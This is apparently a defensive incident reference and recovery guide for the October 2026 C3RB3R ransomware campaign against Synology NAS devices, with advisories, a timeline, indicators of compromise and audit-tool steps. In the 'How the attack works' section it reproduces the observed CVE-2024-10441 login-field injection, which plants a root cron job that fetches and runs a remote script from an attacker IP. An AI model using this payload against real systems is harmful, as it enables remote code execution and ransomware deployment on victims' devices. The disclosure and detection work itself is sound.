# C3RB3R / `.L0CK3D` ransomware against Synology NAS

Public incident reference, indicators of compromise, CLI verification steps, and recovery guide for the October 2026 ransomware campaign targeting internet-exposed Synology NAS devices.

## Summary

- In October 2026, a wave of ransomware attacks encrypted internet-exposed Synology NAS devices, appending the `.L0CK3D` extension (with the digit zero) to files and dropping a ransom note named `read-me3.txt` in each directory ([360, 2026-10-29](https://www.360.cn/n/13055.html)).
- Each `read-me3.txt` note starts with the heading `C3RB3R INSTRUCTIONS` and includes a locally generated 6-digit device identifier ([HKEPC on Threads, 2026-10-29](https://www.threads.com/@hkepc/post/DfFNi9Xibnj)).
- According to Qihoo 360's analysis of sample MD5 `a1375e0f82ae86df528876c049b5a23c`, the encryptor uses a per-file 256-bit ChaCha8 key and 64-bit nonce wrapped with RSA-2048 and appended to the file, fully encrypts 187 priority file extensions, partially encrypts other files, and skips 27 system directories ([360, 2026-10-29](https://www.360.cn/n/13055.html)).
- **[community report]** Victims report that each encrypted file grows by 588 bytes, large non-priority files (such as a 21 MB PDF) have three ~4% stripes encrypted, and existing decryptors from Kaspersky (`RakhniDecryptor`), Emsisoft, and Dr.Web (`Trojan.Encoder.38200`) do not decrypt the files ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/)).
- Malware family lineage is disputed between researchers: Qihoo 360 classifies C3RB3R as a variant of the Cerber family ([360, 2026-10-29](https://www.360.cn/n/13055.html)), whereas BleepingComputer forum researchers have tracked C3RB3R since 2022 as a strain built from leaked Conti v3 source code ([BleepingComputer forum thread](https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/page-4), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)).
- **[community report]** Unverified reports describe the attacker's payment portal offering one free decryption of a file up to 1024 KB and demanding 0.037 to 0.085 BTC (doubling after five days) alongside an unsubstantiated data-exfiltration claim with no known leak site ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)).

## What is known (with sources)

### Synology's statement and Synology-SA-24:20

- **[primary]** On 2026-10-29, Synology published a security statement saying it "identified threat actors exploiting a vulnerability patched in December 2024" on devices running outdated DSM versions to encrypt data and extort ransom, linking directly to advisory Synology-SA-24:20 and urging users to update DSM and enable automatic updates ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions)).
- **[primary]** Synology's 2026-10-29 release does not name a specific CVE, fixed build number, or victim count, and does not mention the strings `C3RB3R`, `.L0CK3D`, `read-me3.txt`, QuickConnect, ports, passwords, or snapshots ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions)).
- **[primary]** Synology-SA-24:20 (published 2024-11-05, DSM 6.2 fix added 2024-12-05, technical details disclosed 2025-03-19, last updated 2025-03-28) covers CVE-2024-10441 (CVSS 3.1 9.8 Critical, improper output encoding in the system plugin daemon allowing remote arbitrary code execution, demonstrated at Pwn2Own 2024), CVE-2024-50629 (CVSS 5.3), and CVE-2024-10445 (CVSS 4.3), with fixed builds DSM 7.2.2-72806-1, 7.2.1-69057-6, 7.2-64570-4, 7.1.1-42962-7, and 6.2.4-25556-8 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20)).

### Qihoo 360's analysis and Synology-SA-26:13

- **[primary for 360's findings]** Qihoo 360's anti-ransomware team reported receiving multiple Synology NAS ransomware cases starting in October 2026, attributed the attacks to C3RB3R, and named CVE-2026-13639 and CVE-2026-13684 (patched in Synology-SA-26:13) as the entry vulnerabilities exploited as 1-day flaws ([360, 2026-10-29](https://www.360.cn/n/13055.html)).
- **[primary]** Synology-SA-26:13 (published 2026-09-18, Critical, Resolved, Mitigation "None") fixes eight DSM vulnerabilities: CVE-2026-13684 (SCGI, CWE-116, CVSS 9.8, unauthenticated arbitrary file read/write and DoS), CVE-2026-13639 (login logic, CWE-331 insufficient entropy, CVSS 9.8, unauthenticated arbitrary file read/write and DoS), CVE-2026-13673 (LDAP API, CVSS 8.8, authenticated), CVE-2026-6205 (Upload API, CVSS 8.1, authenticated), CVE-2026-13635 (Auth API, CVSS 5.3), CVE-2026-13623 (Theme API XSS, CVSS 4.8, admin), CVE-2026-13666 (Sharing API CRLF, CVSS 3.5), and CVE-2026-13683 (EventScheduler API SQLi, CVSS 2.7, admin) ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13)).
- **[primary]** Singapore's Cyber Security Agency (CSA) alert AL-2026-127 highlights the four highest-severity CVEs in SA-26:13 (9.8, 9.8, 8.8, 8.1) across DSM 7.4, 7.3, and 7.2 and advises administrators to patch immediately ([CSA Singapore AL-2026-127, 2026-09-23](https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-127/)).

| DSM branch | SA-26:13 fixed build | SA-24:20 fixed build |
|---|---|---|
| DSM 7.4 | `7.4-90075` and later | Included in baseline |
| DSM 7.3.2 | `7.3.2-86009 Update 4` (`7.3.2-86009-4`) | Included in baseline |
| DSM 7.2.2 | `7.2.2-72806 Update 9` (`7.2.2-72806-9`) | `7.2.2-72806-1` |
| DSM 7.2.1 | `7.2.1-69057 Update 12` (`7.2.1-69057-12`) | `7.2.1-69057-6` |
| DSM 7.2 | Not listed in SA-26:13 (upgrade to a fixed branch) | `7.2-64570-4` |
| DSM 7.1 and older | Not listed in SA-26:13 (upgrade to a fixed branch) | `7.1.1-42962-7` / `6.2.4-25556-8` |

### Synology-SA-26:14 ("PHP2Shell")

- **[primary]** Synology-SA-26:14 (published 2026-10-22, updated 2026-10-26, Critical, Resolved) addresses CVE-2026-109618 and CVE-2026-109619 (CVSS 3.1 9.8 in Synology's advisory; CVSS v4.0 9.2 in NVD/CyberQ), which are PHP-core memory corruption and stale internal request-state flaws leading to remote code execution ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/)).
- **[primary]** Fixed package versions under SA-26:14 are Synology Calendar `3.0.4-21435`, MailStation `30000002.3.19-20333`, PHP 7.4 `7.4.33-0131`, PHP 8.0 `8.0.30-0122`, PHP 8.1 `8.1.34-0120`, PHP 8.2 `8.2.35-0171`, PHP 8.3 `8.3.36-0051`, and PHP 8.4 `8.4.27-0051`; PHP 7.3 is end-of-life with no fix, while Hyper Backup and Synology Drive are listed as not affected ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14)).
- **[primary]** Synology's PHP2Shell statement lists ten affected packages that rely on the PHP packages (Calendar, IDrive, Joomla, KodExplorer, MailStation, MediaWiki, phpMyAdmin, vtigerCRM, Web Station, WordPress), notes that MailStation must be updated manually, extends PHP updates to end-of-life DSM 7.2/7.1/7.0 and 6.2, and states that the PHP built into DSM itself is not exposed ([Synology PHP2Shell statement, 2026-10-22 / 2026-10-28](https://www.synology.com/en-us/company/news/article/php2shell/Synology%20extends%20PHP2Shell%20security%20updates%20to%20end-of-life%20DSM%20versions)).
- **[primary]** CISA added CVE-2026-109618 and CVE-2026-109619 to its Known Exploited Vulnerabilities (KEV) catalog on 2026-10-26 for general PHP exploitation rather than Synology-specific attacks ([CISA KEV alert, 2026-10-26](https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog)).
- **[community report]** Users report that uninstalling PHP 7.4 in Package Center also prompts removal of Hyper Backup when Hyper Backup depends on it; stopping or updating PHP 7.4 avoids removing Hyper Backup ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128)).

### Attribution disagreement across sources

- **Synology (SA-24:20):** Synology's official 2026-10-29 statement links the ransomware attacks on outdated DSM versions to Synology-SA-24:20 (patched in December 2024, covering CVE-2024-10441) ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions)).
- **[community report] Forensic logs matching CVE-2024-10441:** Victim log captures shared by Reddit user `u/NakamuraHwang` and relayed by Dongyun Lab show unauthenticated `SYNO.API.Auth` login requests injecting `PLUGIN_VALUE_END`, `LD_PRELOAD`, and `LD_DEBUG_OUTPUT=/etc/cron.d/synot*` into `/var/log/synoplugin.log`, consistent with CVE-2024-10441 ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [LavX News relay of Tom's Hardware, 2026-10-29](https://news.lavx.hu/article/ransomware-hits-internet-exposed-synology-nas-via-18-month-old-remote-code-flaw), [Mallory summary](https://mallory.ai/stories/01a187e2-d9c9-7ab1-b0ef-d1b444d9a0f3)).
- **Qihoo 360 (SA-26:13):** Qihoo 360's analysis attributes the October 2026 Synology NAS C3RB3R intrusions to 1-day exploitation of CVE-2026-13639 and CVE-2026-13684 from Synology-SA-26:13 ([360, 2026-10-29](https://www.360.cn/n/13055.html)).
- **[press] Unconfirmed PHP2Shell (SA-26:14) and container claims:** Guru3d wrote that Synology "reportedly" linked the campaign to SA-26:14 and relayed claims of compromised Docker/GitLab containers (CVE-2026-97229 / CVE-2026-110264), whereas Synology's own statement links SA-24:20 and both CyberQ and XFastest HK note there is no confirmed evidence tying PHP2Shell to the `.L0CK3D` ransomware cases ([Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/), [HeaTalk, 2026-10-30](https://www.heatalk.com/20261030/17076/), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [XFastest HK, 2026-10-30](https://hk.xfastest.com/195038/synology-nas-attack/)).
- **[community report] Secondary reports on newer DSM builds:** Secondary press relays mention a victim claiming DSM `7.2.1-69057 Update 9` and a Solar incident-response case claiming DSM `7.4.1-90080 Update 1` (newer than the SA-26:13 fixes) where the responders did not rule out an unpatched vector ([itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/), [Appinn, 2026-10-29](https://www.appinn.com/synology-nas-ransomware-2026)).

### Historical context: earlier campaigns against Synology NAS

- **SynoLocker (2014) [primary]:** Exploited two DSM vulnerabilities fixed in late 2013 on DSM 4.3-3810 and earlier, where affected units misleadingly reported "no updates available" in DSM Update ([Synology SynoLocker advisory, 2014-08-07](https://www.synology.com/en-uk/security/advisory/SynoLocker)).
- **July 2019 brute-force wave & eCh0raix / QNAPCrypt [primary / press]:** Attackers used botnet credential stuffing and dictionary attacks against internet-exposed DSM admin accounts to deploy eCh0raix ransomware ([Synology 2019 ransomware release, 2019-07-23](https://www.synology.com/en-uk/company/news/article/2019JulyRansomware), [Security Affairs, 2021-08](https://securityaffairs.com/120994/cyber-crime/ech0raix-ransomware-qnap-synology.html), [Unit 42, 2021-08-10](https://unit42.paloaltonetworks.com/ech0raix-ransomware-soho/)).
- **StealthWorker botnet (2021) [primary]:** Synology PSIRT tracked ongoing botnet brute-force attacks targeting weak administrator credentials across exposed NAS devices ([Synology BruteForce release, 2021-08-04](https://www.synology.com/en-global/company/news/article/BruteForce)).
- **DeadBolt (2022) [primary]:** Targeted internet-facing QNAP and ASUSTOR NAS devices with no confirmed Synology victims, reinforcing guidance to keep NAS management interfaces off the public internet ([Trend Micro, 2022-06-06](https://www.trendmicro.com/en_gb/research/22/f/closing-the-door-deadbolt-ransomware-locks-out-vendors-with-mult.html)).
- **RISK:STATION (2024) [primary]:** Midnight Blue disclosed CVE-2024-10443 in Synology Photos and demonstrated that QuickConnect TLS certificates appear in public Certificate Transparency logs, making millions of `*.quickconnect.to` subdomains enumerable and reachable through the QuickConnect relay even without router port forwarding ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation)).

## Timeline

- **2024-11-05 / 2024-12-05:** Synology publishes Synology-SA-24:20 fixing CVE-2024-10441 in DSM 7.1/7.2 and adds the DSM 6.2 fix in December 2024 ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20)).
- **2026-09-18:** Synology publishes Synology-SA-26:13 fixing CVE-2026-13684, CVE-2026-13639, and six other DSM vulnerabilities ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13)).
- **2026-09-23:** CSA Singapore issues alert AL-2026-127 urging immediate patching for Synology-SA-26:13 ([CSA Singapore AL-2026-127](https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2026-127/)).
- **Early October 2026:** Qihoo 360 begins receiving reports of Synology NAS devices encrypted by C3RB3R / `.L0CK3D` ([360, 2026-10-29](https://www.360.cn/n/13055.html)).
- **2026-10-17 onward:** **[community report]** NAS victims (including Synology and a Zyxel NAS326) begin posting in the BleepingComputer C3RB3R support thread ([BleepingComputer forum thread](https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/page-4), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/)).
- **2026-10-22:** Synology publishes Synology-SA-26:14 ("PHP2Shell", CVE-2026-109618 and CVE-2026-109619) and extends PHP package updates to end-of-life DSM branches ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [Synology PHP2Shell statement](https://www.synology.com/en-us/company/news/article/php2shell/Synology%20extends%20PHP2Shell%20security%20updates%20to%20end-of-life%20DSM%20versions)).
- **2026-10-26:** Synology updates SA-26:14 to note Hyper Backup is unaffected, and CISA adds CVE-2026-109618 and CVE-2026-109619 to the KEV catalog ([Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [CISA KEV alert](https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog)).
- **2026-10-28:** **[community report]** Multiple Synology owners post `.L0CK3D` / `read-me3.txt` infection reports on `r/synology` within 12 hours, and `u/NakamuraHwang` captures the CVE-2024-10441 `LD_DEBUG_OUTPUT=/etc/cron.d/synot*` payload from `/var/log/synoplugin.log` ([r/synology post](https://www.reddit.com/r/synology/comments/1xhyt6w/hit_with_c3rb3r_ransomware_this_am/), [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128)).
- **2026-10-29:** Synology publishes its official statement linking the attacks to SA-24:20, and Qihoo 360 publishes its technical analysis of C3RB3R ([Synology statement, 2026-10-29](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions), [360, 2026-10-29](https://www.360.cn/n/13055.html), [HKEPC on Threads](https://www.threads.com/@hkepc/post/DfFNi9Xibnj)).
- **2026-10-30:** CyberQ, XFastest HK, and itnotetk publish consolidated analyses comparing Synology's SA-24:20 statement, 360's SA-26:13 attribution, and victim reports ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [XFastest HK, 2026-10-30](https://hk.xfastest.com/195038/synology-nas-attack/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)).

## How the attack works

### How a NAS ends up reachable from the internet

- **[community report]** Affected systems had DSM or file services reachable from the internet via manual router port forwards (5000/5001, 443/80 reverse proxy, 445 SMB), router UPnP/NAT-PMP rules created by DSM, or QuickConnect ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/)).
- **[primary]** QuickConnect certificates are logged in public Certificate Transparency logs, allowing attackers to enumerate `*.quickconnect.to` subdomains and reach DSM through the QuickConnect relay even when no ports are forwarded on the router ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation)).
- **[primary]** When a NAS dials PPPoE itself, sits in a router DMZ, or holds a global IPv6 address without an inbound drop rule on the router or DSM firewall, every listening service is directly reachable from the internet ([Synology Firewall Help](https://kb.synology.com/en-global/DSM/help/DSM/AdminCenter/connection_security_firewall?version=7)).
- **[community report]** Pre-authentication vulnerabilities (such as CVE-2024-10441 and CVE-2026-13639 / CVE-2026-13684) execute before password or 2FA checks complete, which is why victims with strong passwords, 2-step verification enabled, and the default `admin` account disabled were still encrypted ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/)).
- **[community report]** Devices on older branches such as DSM `7.1.1-42962 Update 9` display "Your DSM version is up to date" in Control Panel because DSM auto-update does not cross major/minor branch boundaries without a manual update ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)).
- **[community report]** Permanently attached USB backup drives and local Hyper Backup targets without version isolation were encrypted alongside shared folders; in one case (`u/avebelle`) 35 of 36 snapshots were also removed, while other victims found their Btrfs snapshots intact and restored from them ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/)).

### Observed in the wild (2026-10-28)

**[community report]** Observed in the wild (2026-10-28): CVE-2024-10441 (Synology-SA-24:20, output-encoding flaw in the system plugin daemon) used through the DSM sign-in ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128)). The request is `SYNO.API.Auth` v7 `login` with this account field (newlines and tabs are real characters):

```
admin
PLUGIN_VALUE_END
LD_PRELOAD=PLUGIN_VALUE_START
NOP
*	*	*	*	*	root	echo	<base64 of "curl -s http://<IP>/xdy5.sh|sh">	|base64	-d|sh
NOP
PLUGIN_VALUE_END
LD_DEBUG=libs
LD_DEBUG_OUTPUT=/etc/cron.d/synot<xxx>
ESCAPE=PLUGIN_VALUE_START
NOP
```

The injected variables reach a plugin process; glibc's `LD_DEBUG` output, which contains the cron line, is written to `/etc/cron.d/synot<xxx>`, and cron then downloads and runs `xdy5.sh` as root every minute. Builds fixed for SA-24:20 are not affected by this request.

- **[community report]** In victim logs, the unauthenticated injection was recorded as an ordinary failed sign-in roughly two minutes before the root cron job executed and downloaded `http://46.8.78.122/xdy5.sh`, dropping `/bin/qnetd`, `/bin/libgld` (the encryptor binary), and `/bin/l0ck.enc`, with `synotade.<PID>` and `.SYNOACCOUNTDB` corruption messages appearing in system logs and an unknown home directory `admin2` reported on one unit ([Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)).

## Indicators of compromise and how `nas incident --deep` checks them

| Indicator | Where | Item |
|---|---|---|
| `PLUGIN_VALUE_END`, `LD_PRELOAD=`, `LD_DEBUG_OUTPUT` in a sign-in | DSM connection log (`SYNO.Core.SyslogClient.Log`, about the last 10,000 entries) | `exploit_attempts` (normal session) |
| The same strings, `POST weblogin Args: USER=...` with the payload | `/var/log/synoplugin.log*` (root only, rotated as `.xz`) | `exploit_attempts_logs` (`--deep`) |
| "failed to sign in" event text with the payload | `/var/log/synoscgi.log*` (root only, `.xz`) | `exploit_attempts_logs` |
| `authentication failure ... rhost=<IP>` without a `user=` field | `/var/log/auth.log*` (root only) | `exploit_attempts_logs` |
| Source addresses `46.8.78.122`, `104.253.175.125` (`incident.ioc_ips`, extendable) | all of the above, connections | `exploit_attempts`, `exploit_attempts_logs`, `ioc_processes` |
| `/etc/cron.d/synot*`, cron lines with `base64 -d`, `\| sh`, `curl`/`wget`, `xdy5` | `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron` | `ioc_cron` |
| `/bin/libgld`, `/bin/qnetd`, `/bin/l0ck.enc`, any `xdy5*` file | `/bin`, `/usr/bin`, temp folders, `/etc`, `/root`, `/var/spool` (3 levels) | `ioc_binaries` |
| A second uid 0 account; unknown accounts with uid >= 1024 | `/etc/passwd` (package accounts and `incident.allowed_users` excluded) | `ioc_users` |
| `authorized_keys` for root or any home | `/root/.ssh`, `/var/services/homes/*/.ssh`, `/volume*/homes/*/.ssh` | `ioc_ssh_keys` |
| Processes named `libgld`/`qnetd`/`xdy5*` or running from `/tmp`, `/var/tmp`, `/dev/shm`; executables outside Synology paths; established TCP connections to public addresses (reported), to IOC addresses (FAIL) | `/proc` | `ioc_processes` |
| Files matching `*.L0CK3D`, `*.LOCK3D`, or `read-me3.txt` | All visible shared folders via File Station search | `ransomware_files` (`--scan`) |

Verdicts: known-bad hit = `FAIL`; unknown entries (cron lines outside Synology paths, accounts not allow-listed, executables outside Synology paths, `(deleted)` executables, any `authorized_keys`) = `WARN`; attempts in logs = `WARN` with "attempt seen". Container processes are counted, not judged. Log text is shown as data: control characters escaped, lengths capped; `--json` adds the collector's raw result under `deep`.

How `--deep` runs:

- `--backend password`: a temporary root task in Task Scheduler (`SYNO.Core.TaskScheduler.Root create` after `SYNO.Core.User.PasswordConfirm`, `run` v2, deleted afterwards) runs one Python script (zlib + base64 in the task script) ([DSM-API-NOTES.md](DSM-API-NOTES.md)). It stops when `deploy.stage_dir` is a symlink, writes one file `<stage_dir>/nas-deep-<random>.json` with `O_CREAT|O_EXCL|O_NOFOLLOW`, carrying the random marker; the CLI reads it with File Station, checks the marker and deletes it ([DSM-API-NOTES.md](DSM-API-NOTES.md)). `deploy.stage_dir` must be set (a folder in a shared folder the account can write; created if missing).
- `--backend local` (on the NAS as root): the same script runs directly and prints the JSON ([DSM-API-NOTES.md](DSM-API-NOTES.md)).
- Nothing else is written; the script only reads ([DSM-API-NOTES.md](DSM-API-NOTES.md)).

Equivalent by hand (as root): `xzcat -f /var/log/synoplugin.log* /var/log/synoscgi.log* /var/log/auth.log* | grep -E 'PLUGIN_VALUE_END|LD_DEBUG_OUTPUT|46\.8\.78\.122|104\.253\.175\.125'`, `ls -la /etc/cron.d /bin/libgld /bin/qnetd /bin/l0ck.enc`, `awk -F: '$3>=1024 || ($3==0 && $1!="root")' /etc/passwd`, `ls -la /root/.ssh /var/services/homes/*/.ssh`, `ls -l /proc/*/exe`, `cat /proc/net/tcp`.

## "Am I affected?" decision steps using the CLI

1. **Run the read-only audit with port probing and ransom-note search:**
   ```bash
   nas incident --probe --scan --json
   ```
2. **Run the deep root collector to inspect root-only logs, crontabs, binaries, users, SSH keys, and `/proc`:**
   ```bash
   nas incident --deep --json
   ```
3. **Interpret the results:**
   - **`ransomware_files: FAIL` or any `ioc_*` (`ioc_cron`, `ioc_binaries`, `ioc_users`, `ioc_processes`) is `FAIL`:** The NAS has active or completed C3RB3R compromise indicators; proceed immediately to [Recovery steps](#recovery-steps) below ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide)).
   - **`external_signins: FAIL`:** Successful logins occurred from outside `allowed_networks`; inspect `nas logs --limit 20000` and `nas inventory` for unauthorized accounts, scheduled tasks, or packages ([Synology ransomware KB](https://kb.synology.com/en-global/DSM/tutorial/What_to_do_when_NAS_attacked_by_ransomware)).
   - **`exploit_attempts: WARN` or `exploit_attempts_logs: WARN` while all `ioc_*` and `ransomware_files` are `PASS`:** An attacker sent the CVE-2024-10441 payload to the NAS, and `ioc_cron` / `ioc_binaries` `PASS` shows no planted `/etc/cron.d/synot*` or `/bin/libgld` artifact was found; close internet exposure and patch immediately with `nas incident fix` ([Synology-SA-24:20](https://www.synology.com/en-global/security/advisory/Synology_SA_24_20)).
   - **`dsm_version`, `firewall`, `quickconnect`, `router_port_forwarding`, `autoblock`, `smb_min_protocol`, `admin_account`, `snapshot_schedule:<share>`, or `snapshot_worm:<share>` is `FAIL` with no compromise indicators:** The NAS is unpatched or exposed but not infected; apply hardening with `nas incident fix --ransom-scan --yes` ([Synology C3RB3R statement](https://www.synology.com/en-global/company/news/article/C3RB3R/Synology%20urges%20users%20to%20update%20DSM%20following%20ransomware%20attacks%20on%20outdated%20DSM%20versions)).

## Recovery steps

### 1. Preserve evidence and memory first (do not reboot or factory-reset immediately)

- **[primary]** Isolate the NAS from the network immediately by unplugging the WAN uplink or disabling router port forwards, and only power down if you cannot disconnect the network, because powering off or rebooting destroys volatile memory evidence ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide), [CISA: I've been hit by ransomware](https://www.cisa.gov/stopransomware/ive-been-hit-ransomware)).
- **[primary / community]** While Synology's general ransomware KB jumps directly to a factory reset, Synology's 2014 SynoLocker advisory noted that resetting removes information needed for decryption, and the open-source `soimy/c3rb3r-rescue` tool can attempt to extract per-session key material from RAM only if the `libgld` encryptor process is still running and the NAS has not been rebooted (suspend the process with `kill -STOP` and dump process memory before stopping it) ([Synology ransomware KB](https://kb.synology.com/en-global/DSM/tutorial/What_to_do_when_NAS_attacked_by_ransomware), [Synology SynoLocker advisory](https://www.synology.com/en-uk/security/advisory/SynoLocker), [GitHub: soimy/c3rb3r-rescue](https://github.com/soimy/c3rb3r-rescue)).
- **[community]** `nas incident contain --yes` does the freeze in one step: it finds processes that look like the encryptor (`libgld`, `qnetd`, executables in temporary folders, processes holding `*.L0CK3D` or `read-me3.txt` open), sends `SIGSTOP` to every thread, and confirms each thread is in state `T`; `--stop-sync` also pauses Cloud Sync, Hyper Backup and Container Manager, and `--release` resumes them. Memory capture and key recovery then follow the c3rb3r-rescue toolkit ([GitHub: soimy/c3rb3r-rescue](https://github.com/soimy/c3rb3r-rescue)).
- **[press / community]** If DSM is still reachable over the LAN, stop Container Manager containers and pause Hyper Backup and Cloud Sync tasks immediately so encrypted files do not overwrite clean backup versions, and disconnect SMB client machines ([Guru3d relaying HKEPC, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/)).
- **[primary]** Export forensic records before making changes: keep copies of `read-me3.txt` and several `.L0CK3D` files, export Log Center archives, and save `nas --json logs --limit 20000 > logs.json`, `nas --json inventory > inventory.json`, and `nas --json incident --deep > incident-deep.json` ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide), [Guru3d, 2026-10-29](https://www.guru3d.com/story/synology-nas-devices-hit-by-l0ck3d-ransomware-campaign/)).

### 2. Do not pay the ransom

- **[primary]** Neither the FBI nor Qihoo 360 supports paying a ransom: paying does not ensure decryption keys will be delivered or work, and there is no universal public decryptor for C3RB3R as of 2026-10-30 ([FBI ransomware guidance](https://www.fbi.gov/contact-us/field-offices/memphis/news/press-releases/fbi-memphis-field-office-reminds-tennesseans-about-the-risk-of-ransomware), [360, 2026-10-29](https://www.360.cn/n/13055.html), [CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/)).

### 3. Eradicate persistence before reconnecting

- **[primary / community]** Installing a DSM update alone does not remove backdoors planted by an attacker; inspect and clean `/etc/cron.d/synot*`, DSM Task Scheduler tasks, `/bin/libgld`, `/bin/qnetd`, `/bin/l0ck.enc`, unauthorized accounts or home directories (such as `admin2`), and SSH `authorized_keys`, or perform a clean DSM reinstall after preserving evidence ([Midnight Blue RISK:STATION, 2024-11-01](https://www.midnightblue.nl/research/riskstation), [Dongyun Lab / dylab, 2026-10-29](https://dylab.org/archives/1128), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)).

### 4. Restore data from Btrfs snapshots or offline backups

- **[community / press]** Verify that the target Btrfs snapshot (`Snapshot Replication > Snapshots > select shared folder > Restore to this snapshot` or `#snapshot` in File Station) or offline/off-site Hyper Backup version predates the earliest `read-me3.txt` timestamp before restoring ([CyberQ, 2026-10-30](https://cyberq.tw/2026/10/30/synology-nas-c3rb3r-ransomware/), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)).
- **[primary / community]** After restoring or reinstalling DSM, update DSM to the SA-26:13 fixed build (`nas upgrade --yes`, and verify `/etc.defaults/VERSION` `smallfixnumber`), update or stop SA-26:14 packages, rotate all administrator and service passwords, and run `nas incident --scan --deep` to confirm a clean state before reconnecting ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13), [Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14), [itnotetk, 2026-10-30](https://www.itnotetk.com/2026/10/30/synology-nas-c3rb3r-l0ck3d-ransomware/)).

## Prevention

- **Patch DSM and packages:** Keep DSM on the latest SA-26:13 / SA-24:20 fixed build (`nas status`, `nas upgrade --yes`) and keep Package Center packages updated for SA-26:14 (`nas inventory`, `nas incident fix --only packages`) ([Synology-SA-26:13](https://www.synology.com/en-global/security/advisory/Synology_SA_26_13), [Synology-SA-26:14](https://www.synology.com/en-us/security/advisory/Synology_SA_26_14)).
- **Remove internet exposure:** Disable QuickConnect (`nas incident fix --only quickconnect`), disable UPnP router port-forwarding rules (`nas incident fix --only router_port_forwarding`), and enable a default-deny DSM firewall allowing only LAN/VPN subnets (`nas incident fix --only firewall`) ([Midnight Blue RISK:STATION](https://www.midnightblue.nl/research/riskstation), [Synology Firewall Help](https://kb.synology.com/en-global/DSM/help/DSM/AdminCenter/connection_security_firewall?version=7)).
